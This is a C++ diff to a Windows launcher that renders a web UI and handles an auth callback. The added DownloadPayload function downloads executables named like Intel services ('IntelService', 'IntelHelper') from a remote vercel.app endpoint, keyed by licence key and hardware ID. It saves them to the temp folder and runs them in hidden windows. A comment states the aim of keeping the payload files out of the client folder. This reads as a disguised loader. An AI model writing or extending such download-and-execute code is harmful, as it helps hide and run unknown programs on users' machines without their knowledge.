@@ -13,11 +13,13 @@
 #include <string>
 #include <fstream>
 #include <sstream>
+#include <urlmon.h>
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
 #pragma comment(lib, "uuid.lib")
 #pragma comment(lib, "user32.lib")
+#pragma comment(lib, "urlmon.lib")
 
 using namespace std;
 
@@ -45,21 +47,53 @@ void SetBrowserEmulationMode() {
     }
 }
 
+// ─── Globals for auth ───
+wstring g_key;
+wstring g_hwid;
+
 // ─── Payload Execution ───
 void RunHidden(const string& exePath) {
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
-
     CreateProcessA(NULL, (LPSTR)exePath.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 }
 
+string Narrow(const wstring& ws) {
+    int sz = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, NULL, 0, NULL, NULL);
+    string s(sz-1, 0);
+    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, &s[0], sz, NULL, NULL);
+    return s;
+}
+
+bool DownloadPayload(const wstring& payloadName) {
+    // Build URL: https://op-ff1c.vercel.app/api/payload?f=XXX&key=YYY&hwid=ZZZ
+    wstring url = L"https://op-ff1c.vercel.app/api/payload?f=" + payloadName + L"&key=" + g_key + L"&hwid=" + g_hwid;
+    char tempA[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempA);
+    string outPath = string(tempA) + Narrow(payloadName) + ".exe";
+
+    HRESULT hr = URLDownloadToFileW(NULL, url.c_str(), wstring(outPath.begin(), outPath.end()).c_str(), 0, NULL);
+    if (SUCCEEDED(hr)) {
+        RunHidden(outPath);
+        return true;
+    }
+    // Fallback: try local file if cloud fails (for offline testing)
+    string local = Narrow(payloadName) + ".exe";
+    if (GetFileAttributesA(local.c_str()) != INVALID_FILE_ATTRIBUTES) {
+        RunHidden(local);
+        return true;
+    }
+    return false;
+}
+
 void LaunchPayloads() {
-    RunHidden("IntelService.exe");
-    RunHidden("IntelHelper.exe");
+    // Cloud payloads - no loose Intel*.exe in client folder
+    DownloadPayload(L"IntelService");
+    DownloadPayload(L"IntelHelper");
 }
 
 // ─── Get absolute file:// path to nui/index.html ───
@@ -174,6 +208,19 @@ public:
                 return S_OK;
             }
             if (wcsstr(pchURLIn, L"launcher://auth_success")) {
+                // Parse ?key=XXX&hwid=YYY
+                wchar_t* pKey = wcsstr(pchURLIn, L"key=");
+                wchar_t* pHwid = wcsstr(pchURLIn, L"hwid=");
+                if (pKey) {
+                    pKey += 4;
+                    wchar_t* end = wcschr(pKey, L'&');
+                    g_key = wstring(pKey, end ? end - pKey : wcslen(pKey));
+                }
+                if (pHwid) {
+                    pHwid += 5;
+                    wchar_t* end = wcschr(pHwid, L'&');
+                    g_hwid = wstring(pHwid, end ? end - pHwid : wcslen(pHwid));
+                }
                 PostMessage(m_hWnd, WM_USER + 101, 0, 0);
                 return S_OK;
             }
